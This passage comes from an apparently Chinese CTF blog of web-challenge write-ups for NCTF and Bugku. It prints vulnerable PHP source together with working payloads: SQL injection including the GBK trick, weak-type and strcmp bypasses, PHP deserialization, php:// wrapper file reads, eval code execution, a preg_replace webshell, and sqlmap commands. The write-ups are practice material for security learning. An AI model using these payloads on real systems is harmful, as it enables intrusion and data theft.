SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125; &#125; ?&gt; GBK Injection提示是GBK注入 尝试id&#x3D;1’ or 1&#x3D;1#，回显的语句中，发现’前面多了一个\\ 后台代码的逻辑应该是当检测到’时，在前面加上一个\\，在mysql中，\\之后的字符会被转义，失去其原有的功能 在’前面加上一个%df，因为在mysql中，gbk占两个字节，而\\只有一个字节，所以当%df和\\写在一起时，两个字节会结合成一个字，从而消除掉\\ http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 //ctf,ctf2,ctf3,ctf4,news http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23 //id,flag http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&#39; union select id,flag from ctf4%23 //nctf&#123;gbk_3sqli&#125; 需要注意的是，在输入table_name时，也需要用到单引号，但是如果在这里加入%df，就会破坏语句结构，所以这里可以将表名转换为十六进制 &#x2F;x00打开之后有源码 if (isset ($_GET[&#39;nctf&#39;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE) echo &#39;必须输入数字才行&#39;; else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) die(&#39;Flag: &#39;.$flag); else echo &#39;骚年，继续努力吧啊~&#39;; &#125; 意思是输入的字符串必须带有#biubiubiu，但是如果输入的必须为数字 直接用%00截断，需要注意的是，get方式传#要经过url编码才行 传入数组mctf[]&#x3D;1也可以得到flag ?nctf=1%00%23biubiubiu ?nctf[]=1 bypass againif (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) &#123; if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;]) if (md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;])) die(&#39;Flag: &#39;.$flag); else print &#39;Wrong.&#39;; &#125; 弱类型和md5碰撞都可以获得flag ?a[]=1&amp;b[]=2 ?a=QNKCDZO&amp;b=s878926199a 上传绕过要求上传一个文件，试了一下sao操作，上传php4、pht之类的后缀，都被过滤了，过滤规则有点严啊 仔细观察上传的包，发现其中带有路径，理所应当的想到了00截断，试了一下还能成功了 sql注入1过关源码，点击就送 &lt;html&gt; &lt;head&gt; Secure Web Login &lt;/head&gt; &lt;body&gt; &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; echo &#39;&lt;/br&gt;&#39;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125; &#125; echo $query[user]; ?&gt; &lt;form method=post action=index.php&gt; &lt;input type=text name=user value=&quot;Username&quot;&gt; &lt;input type=password name=pass value=&quot;Password&quot;&gt; &lt;input type=submit&gt; &lt;/form&gt; &lt;/body&gt; &lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt; &lt;/html&gt; 跟普通的Sql注入没什么两样，注意在于trim()这个函数，这个函数可以制定过滤字符串，当这个函数没有指定过滤什么字符串时，默认过滤以下所有 &quot;\\0&quot; - NULL &quot;\\t&quot; - 制表符 &quot;\\n&quot; - 换行 &quot;\\x0B&quot; - 垂直制表符 &quot;\\r&quot; - 回车 &quot; &quot; - 空格 这里能影响我们的只有空格，不过既然是表单绕过，完全可以不用空格 user=admin&#39;||1)#&amp;pass=Password user=admin&#39;/**/or/**/1)#&amp;pass=Password pass check提示给出了源代码 $pass=@$_POST[&#39;pass&#39;]; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) &#123; if(@!strcmp($pass,$pass1))&#123; echo &quot;flag:nctf&#123;*&#125;&quot;; &#125;else&#123; echo &quot;the pass is wrong!&quot;; &#125; &#125;else&#123; echo &quot;please input pass!&quot;; &#125; ?&gt; 使!strcmp($pass,$pass1)返回true即可绕过，strcmp函数有一个漏洞，当传入的值不是字符串时，函数会报错并返回一个0，0取反为1，即为ture 起名字真难&lt;?php function noother_says_correct($number) &#123; $one = ord(&#39;1&#39;); //获取1的ascii值 $nine = ord(&#39;9&#39;); //获取9的ascii值 for ($i = 0; $i &lt; strlen($number); $i++) &#123; //遍历输入的字符串，只要输入的字符串中有数字则返回false $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#39;54975581388&#39;; //把输入的字符串与54975581388对比，相同则返回true &#125; $flag=&#39;*******&#39;; if(noother_says_correct($_GET[&#39;key&#39;])) echo $flag; else echo &#39;access denied&#39;; ?&gt; 审计时要细心！细心！细心！ 第一次看理解错误，无法理解题意，后来看明白了。要求输入的值等于54975581388，但是不允许输入数字 输入54975581388的十六进制，为0xccccccccc，刚好没有数字 密码重置url中的user1&#x3D;Y3RmdXNlcg&#x3D;&#x3D;非常的可疑，base64解码之后发现是ctfuser，刚好跟下面的user&#x3D;ctfuser相等，尝试把admin用base64编码，并且用表单提交user&#x3D;admin，flag就出来了 ?user1=YWRtaW4= [post data] user=admin php反序列化做的时候这题显示的是暂时不可做，但是很想做关于反序列化的题，就在网上找了一下这题的wp，结果意外的发现了该题的源代码。倒是可以在本地复现 云做题 &lt;?php class just4fun &#123; var $enter; var $secret; &#125; if (isset($_GET[&#39;pass&#39;])) &#123; $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;; ?&gt; 大致的题意就是在把输入的值反序列化之后，会给secret重新赋一次值，这个值是未知的，估计是flag，之后要求sercet和enter相等即可绕过 只要将sercet的值引用赋值给enter即可 &lt;?php class just4fun &#123; var $enter; var $secret; &#125; $JuH0n = new just4fun(); $JuH0n -&gt; enter = &amp;$JuH0n -&gt; secret; $pass = serialize($JuH0n); print_r($pass); ?&gt; //O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; 用pass传入即可绕过 SQL Injection右键查看源代码，获得源码 &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //获取当前 magic_quotes_gpc 的配置选项设置，在php5.4之后会永远返回flase $str=stripslashes($str); //删除反斜杠 &#125; return htmlentities($str, ENT_QUOTES); //把传入的字符串html实体化，这里的作用是把单引号实体化，就是使其无效 &#125; $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#39;Invalid password!&#39;); &#125; echo $flag; --&gt; 提示仔细看函数的用法，所以我很仔细的研究了stripslashes()和htmlentities()函数的用法 思路就是绕过前面的过滤规则，让下面的sql查询语句返回真即可 stripslashes()删除反斜杠，htmlentities()无效单引号，配合完美，此题无解 其实stripslashes()只在if条件get_magic_quotes_gpc()放回true时才会执行，但是在php5.4之后这个函数永远返回false，虽然不知道服务端是php几的，但是如果是5.4之前并且开启这个函数，那么此题就无解了，但是ctf的题，永远都会有解 被转义的单引号实际上在sql语句查询的时候会生效，这里的转义只在php这里转义，所以我们可以把语句简化一下 SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39; 因为被转义了单引号，所以这里不能用闭合的思路去做。架设get_magic_quotes_gpc()返回false，那么我们可以通过传入反斜杠来吃掉一个单引号，构造语句 ?username=\\&amp;password=||1%23 得到flag 综合题打开屏幕，满屏的jsfuck代码，复制到控制台执行，得到一个网页1bc29b36f623ba82aaf6724fd3b16718.php 访问这个页面，提示tip在我脑袋里，猜测tip是在响应头中 bp抓包，果然在响应头中有个tip：history of bash 到这里我卡了很久，因为不知道这个history of bash到底是什么玩意，度娘告诉我是linux的命令，但是在这里估计不是这个意思 看了wp之后才知道意思是.bash_history文件，访问这个文件，发现压缩命令以及flagbak.zip，访问这个文件即可得到flag SQL注入2又是点击就送的源码 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125; &#125; ?&gt; 源码的意思是，将输入的user放入查询语句中查询，数据库中的ctf表中应该是事先将user的密码经过md5计算，之后再把输入的pass经过md5计算之后，和查询语句的结果进行对比，相同则通过验证 构建语句 [POST DATA] user=&#39; union select md5(1)#&amp;pass=1 根据union的特性，因为前面是查不到东西的，所以sql查询语句返回的值为md5(1)，即可达到绕过 综合题2很有意思的一道题，更偏向于真实的渗透环境 首先先右键源代码，渗透第一步，收集信息。可以在index的源代码中找到so.php、preview.php、sm.txt这些页面，值得注意的是，源代码中有一个href标签链接到about.php?file&#x3D;sm.txt，点开之后发现是任意文件读取漏洞，可以利用about.php读取所有的源码 读取sm.txt之后，又发现了config.php、passencode.php、say.php文件，利用任意文件读取漏洞来读取这些页面的源代码。在审计源码的过程中，还发现了antiinject.php、antixss.php两个页面，看名字也知道，这两个页面是用来防御sql注入以及xss攻击的 审计源码的过程中发现一直在提示不是xss的，antixss.php中也没看出什么可以绕过的地方，倒是antiinject.php，过滤了一些关键词，但是函数本身可以双写绕过 在用读取about.php的源码时，能发现about.php在读取源码的时候过滤了loginxlcteam目录和config.php，loginxlcteam与其说是文件，更像是一个目录，访问loginxlcteam，发现了管理员后台登录系统。 试了一下，发现好像无法注入，且被about过滤也没办法读取源码 接下来的思路就很清晰了，想办法拿到管理员账户。而在上一步审计源码的过程中，我们发现了so.php是可以注入的，回到so.php尝试注入 需要注意的是，如果直接访问so.php是无法注入的，config.php应该有检测referer的手段，必须从index.php底下的搜索留言那里注入。另外，提示也直接给出了admin的表的结构，省去了注入的一大堆步骤 soid=-1/**/uniunionon/**/selecselectt/**/1,usernamnamee,3,4/**/from/**/admiadminn //得到用户名 soid=-1/**/uniunionon/**/selecselectt/**/1,userpaspasss,3,4/**/from/**/admiadminn //得到密码 表中只有一条数据，admin和密码，密码注出来的结果是102 117 99 107 114 117 110 116 117，在passencode.php中我们能发现，密码加密的算法实际上就是把密码转为ascii值存储，用ascii对照表一对照就可以得到密码 进入后台之后，提示在根目录下有写好的木马文件xlcteam.php，利用about读出源码 &lt;?php $e = $_REQUEST[&#39;www&#39;]; $arr = array($_POST[&#39;wtf&#39;] =&gt; &#39;|.*|e&#39;,); array_walk($arr, $e, &#39;&#39;); ?&gt; 三个参数的回调木马，自己试了一下，怎么也执行不了，看了大佬的wp才知道利用方法 [POST DATA] www=preg_replace&amp;wtf=print_r(scandir(&quot;./&quot;)) 读取根目录下的所有文件，转换一下编码，发现flag文件，打开即获得flag 密码重置2file_get_contents右键查看源代码 &lt;!--$file = $_GET[&#39;file&#39;]; if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf; &#125;--&gt; 看到file_get_contents函数，下意识想到php伪协议 用hackbar输入 url?file=php://input [POSTDATA] meizijiu 获得flag 变量覆盖右键查看源代码 &lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag; &#125;--&gt; foreach函数存在变量覆盖漏洞，输入??name&#x3D;meizijiu233即可","categories":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://perfect-time.xyz/tags/wp/"}],"keywords":[{"name":"ctf","slug":"ctf","permalink":"https://perfect-time.xyz/categories/ctf/"}]},{"title":"bugku-web-wp","slug":"bugku-wp","date":"2018-10-22T12:19:47.000Z","updated":"2022-07-05T05:03:54.000Z","comments":true,"path":"2018/10/22/bugku-wp/","link":"","permalink":"https://perfect-time.xyz/2018/10/22/bugku-wp/","excerpt":"show time!","text":"show time! web2右键检查元素，flag一眼就看到了 计算器前端限制只能输入1位数字，但是验证码至少为两位，按f12进入开发者模式，更改input的maxlength属性即可 web基础$_GET页面有源代码提示，意思是接受传入的get参数what，如果what&#x3D;flag，则弹出flag。在url后面加上?what=flag即可 web基础$_POST原理跟get的一样，只是方法改为post，用hackbar发送what&#x3D;flag即可 矛盾$num=$_GET[&#39;num&#39;]; if(!is_numeric($num)) 判断如果num不是数字这执行以下代码 &#123; echo $num; if($num==1) 如果num=1，则输出flag echo &#39;flag&#123;**********&#125;&#39;; &#125; 要求输入的值不为数字，而又当输入的值为1时才输出flag 看似互相矛盾，但是可以利用php的弱类型的松散型来得到flag 在php中，当数字和字符串比较时，从头开始搜索字符串，直到遇到第一个字符为止。该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 所以主要在url后面加上?num=1a，因为1a本身是字符串可以通过if判断，因为弱类型会把1a转换为1，就可以得到flag了 web3右键源代码，最底下有一串&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 这一串编码为HTML实体编码，以&amp;#开头的后接十进制，以&amp;#x开头的后接十六进制，后面接的数字实际上是ascii编码 解码可得flag 域名解析把flag.bugku.com 解析到120.24.86.145，打开本地hosts文件，输入120.24.86.145 flag.bugku.com即可 值得注意的是，直接访问120.24.86.145显示的是400 度娘的解释是，服务器不理解请求的语法。这里的意思应该是检查了请求包中的host字段，如果不为flag.bugku.com则返回400错误 其实有个比改hosts文件更简便的方法，访问ip，抓包，将host字段的值改为flag.bugku.com即可，事实上，改hosts文件也就是将host字段改为hosts文件里对应的域名而已 你必须让他停下打开页面，页面会不停的自动刷新，因为是用javascript来刷新页面，直接禁用js就可以让他停下，但是没用 多抓几次包之后发现当刷新到的图片为10.jpg时，会显示出图片，切包中有flag，应该是随机刷新flag 利用bp的重放功能，随机刷新到10.jpg即可 本地包含&lt;?php include &quot;flag.php&quot;; $a = @$_REQUEST[&#39;hello&#39;]; eval( &quot;var_dump($a);&quot;); show_source(__FILE__); ?&gt; 观察代码可知这是一个任意代码执行漏洞，可以闭合代码或者直接执行输入?hello=file(&quot;flag.php&quot;)或者?hello=);print_r(file(&quot;flag.php&quot;) 变量1flag In the variable ! &lt;?php error_reporting(0); 隐藏错误信息 include &quot;flag1.php&quot;; highlight_file(__file__); if(isset($_GET[&#39;args&#39;]))&#123; $args = $_GET[&#39;args&#39;]; if(!preg_match(&quot;/^\\w+$/&quot;,$args))&#123; 审计输入的内容，只能输入字母和下划线 die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;); &#125; ?&gt; 提示flag在变量中，但是不知道是哪个变量 var_dump($$args)这条意思是把$args的值作为变量的名字并打印出来 但是我们不知道flag储存在哪个变量中。使用$GLOBALS，在php中，$GLOBALS为全局变量，其作用是包含了全部变量的全局组合数组。变量的名字就是数组的键。 因为是get方式传值，在url中输入?args&#x3D;GLOBALS即可 web5右键源代码，发现一串很奇怪的代码 ([][(![]+[])[+[]]+([![]]+[][[]])大概是这样的内容，这其实是一串jsfuck代码 按f12，打开控制台，直接把源代码中的jsfuck代码输入到控制台，回车就能得到答案 头等舱打开网页，什么都没有，源代码也是 抓包查看响应头，能得到flag 网站被黑打开御剑扫面网站后台，发现一个shell.php文件，点开发现是一个webshell，但是不知道webshell的密码 用bp的爆破功能来爆破密码，字典用自带的passwords即可爆破，密码是hack 管理员系统一开始以为是表单绕过，尝试注入之后发现并没有什么变化，提示ip被禁止访问 查看源代码，发现一串被注释base64代码，这串代码右键源代码是看不见的，必须用f12的查看器才能看见 解码之后等于test123，猜测是管理员的密码，但是输入之后还是提示ip被禁止，提示信息中有提到本地管理员，猜测是需要本地访问 用bp抓包，在请求头中加入一对键值X-Forwarded-For : 127.0.0.1 发包即可获得flag web4右键源代码，看到一串js代码，大致意思就是将三串url编码过的代码连起来，解码之后得到完整的Js代码 p1=function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit; 这段代码的意思大致是判断输入的值是否为67d709b2b54aa2aa648cf6e87a7114f1，直接在输入框中输入就能得到flag flag在index里点击之后url中显示?file&#x3D;show.php，猜测是文件包含漏洞 输入?file&#x3D;index.php之后，返回的源代码中有36000多个title标签，常试读取index.php的源代码，输入?file=php://filter/read=convert.base64-encode/resource=index.php 解码可得flag 输入密码查看flag提示5位数密码，直接用bp爆破即可。密码是13579 点击一百万次右键查看源代码，当点击数到一百万次的时候，会发送一个post，直接用hackbar发送clicks&#x3D;999999999即可 听说备份是个好习惯提示中提到了备份，说明此题跟备份文件有关。利用扫描备份文件的脚本可以扫出 这里可以使用@王一航的大佬的源码泄露工具 https://git.coding.net/yihangwang/SourceLeakHacker.git 另外用御剑也可以扫描到，两者差别不大，看个人喜好 扫描发现了一个index.php.bak文件，访问这个文件得到源码 include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); //php ini 的设置 $str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); //strstr函数获取url中?以后的内容 $str = substr($str,1); //将第一位？删除 $str = str_replace(&#39;key&#39;,&#39;&#39;,$str); 把字符串中的&#39;key&#39;替换为空 parse_str($str); //把字符串解析到变量中 echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;; &#125; //当key1和key2的md5值相同，但值不同时，输出flag ?&gt; 首先要先解决把key值替换为空的问题，这个比较简单，重写key为kekeyy即可绕过 绕过之后要解决两个变量md5值相同，但值不同的问题，这里有两种方法 1、md5是无法处理数组的，如果传入数组，则会返回null，所以两个数组通过md5加密之后都是null，而数组的名字是不同的。这就可以绕过了 ?kekeyy1[]=1&amp;kekeyy2[]=22、利用php的弱类型漏洞，如果两个字符经过md5加密之后的值为0exxxxxxx的类型，就会被认为是科学计数法，表示的是0^10的xxxxxxxx次方，结果还是0，所以是相等的 以下字符串的md5值都是以0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 从中挑两个作为key1和key2的输入即可 ?kekeyy1=QNKCDZO&amp;kekeyy2=s878926199a 成绩单显而易见的sql注入题 根据2-1返回的是2的数据可知是字符型，接下来就很简单了 id=1&#39; order by 4# id=0&#39; union select 1,2,3,4 # id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() # id=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; # id=0&#39; union select 1,2,3,group_concat(skctf_flag) from fl4g # 因为没有做什么防护，所以用sqlmap也可以轻松爆出，但是如果手工熟练的话手工注入的速度会比sqlmap快很多 python sqlmap.py -u &quot;http://120.24.86.145:8002/chengjidan/index.php&quot; --data &quot;id=1&quot; --dbs python sqlmap.py -u &quot;http://120.24.86.145:8002/chengjidan/index.php&quot; --data &quot;id=1&quot; -D skctf_flag --tables python sqlmap.py -u &quot;http://120.24.86.145:8002/chengjidan/index.php&quot; --data &quot;id=1&quot; -D skctf_flag -T fl4g -- dump 秋名山老司机要求计算式子，但是式子本身太复杂，只能交由脚本来计算 # -*- coding: UTF-8 -*- import requests import re url = &quot;http://123.206.87.240:8002/qiumingshan/&quot; s = requests.Session() r = s.get(url) k = re.search(&#39;(?&lt;=&lt;div&gt;)(.*)(?==)&#39;,r.text).group(0) #正则表达式匹配字符串，使用零宽断言来匹配式子 v = eval(k) r = s.post(url, data=&#123;&#39;value&#39;:v&#125;) r.encoding = &#39;UTF-8&#39; print(r.text) raw_input(&quot;Press &lt;enter&gt;&quot;) 有时候可能会跑不出结果，多运行几次即可 速度要快右键源代码，可以发现提示，提示使用post方式传值，参数的名称是margin 用hackbar传入一个1，提示你还不够快 bp抓包之后发现消息头中有flag，base64解码之后提交，提交失败 原来他的flag每次请求都是会变的，发现这点之后就有了思路，用脚本来发送flag # -*- coding: UTF-8 -*- import requests import base64 import re url = &quot;http://123.206.87.240:8002/web6/&quot; s = requests.Session() #保持访问时的session r = s.get(url).headers[&quot;flag&quot;] #flag在消息头中，这样可以获取消息头中的flag参数 r = str(base64.b64decode(r)) #将获取到字符串base64解码 &#39;&#39;&#39; k = re.search(&#39;(?&lt;=:)(.*)&#39;,r).group(0) #正则匹配，匹配等号后面的flag r = base64.b64decode(k) #再将匹配的结果base64编码 &#39;&#39;&#39; r = base64.b64decode(r.split(&quot;: &quot;)[1]) #获取等号后面的flag r = s.post(url,data=&#123;&#39;margin&#39;:r&#125;) #通过post传值 print(r.text) raw_input(&quot;Press &lt;enter&gt;&quot;) 需要注意的是，获取到flag之后，还需要将flag再进行base64编码之后再提交，我在这里绕了好久 一开始使用正则表达式匹配flag，后来发现直接用split更快 cookie欺骗never give up右键查看源代码，会看见1p.html的提示，访问1p.html，页面跳转到了其他地方，用bp抓包可以查看1p.html的源代码，或者直接访问view-source:http://120.24.86.145:8006/test/1p.html 发现源码 var Words =&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; function OutWord() &#123; var NewWords; NewWords = unescape(Words); document.write(NewWords); &#125; OutWord(); 这是一串url编码，解码可得 &lt;script&gt;window.location.href=&#39;http://www.bugku.com&#39;;&lt;/script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;&quot; 意为点击后跳转到www.bugku.com，注释里是一串base64编码，解码得到 %22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E 还是url编码，再进行解码 if(!$_GET[&#39;id&#39;]) &#123; header(&#39;Location: hello.php?id=1&#39;); exit(); &#125; $id=$_GET[&#39;id&#39;]; $a=$_GET[&#39;a&#39;]; $b=$_GET[&#39;b&#39;]; if(stripos($a,&#39;.&#39;)) &#123; echo &#39;no no no no no no no&#39;; return ; &#125; $data = @file_get_contents($a,&#39;r&#39;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) &#123; require(&quot;f4l2a3g.txt&quot;); &#125; else &#123; print &quot;never never never give up !!!&quot;; &#125; 看似需要满足很多条件才能得到flag，事实上满足条件之后也只是把f4l2a3g.txt文件内容打印出来而已，直接访问这个文件即可得到flag welcome to bugkuctf右键查看源代码，发现源码提示 &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; 